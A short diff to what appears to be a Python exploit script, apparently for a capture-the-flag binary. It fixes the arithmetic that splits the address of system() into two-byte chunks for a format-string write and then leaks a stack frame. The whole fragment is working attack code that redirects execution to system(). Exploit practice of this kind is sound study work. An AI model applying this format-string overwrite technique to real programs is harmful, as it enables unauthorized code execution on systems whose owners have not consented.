@@ -26,7 +26,7 @@ print(str_system)
 
 #break into 2 byte components
 sys_1 = int(str_system[4:8], 16) - 0x16 #16 bytes already written
-sys_2 = int(str_system[8:12], 16) - sys_1 #math to get next address right
+sys_2 = int(str_system[8:12], 16) - sys_1 - 0x16 #math to get next address right
 
 #leak previous stack frame
 proc.recvline()
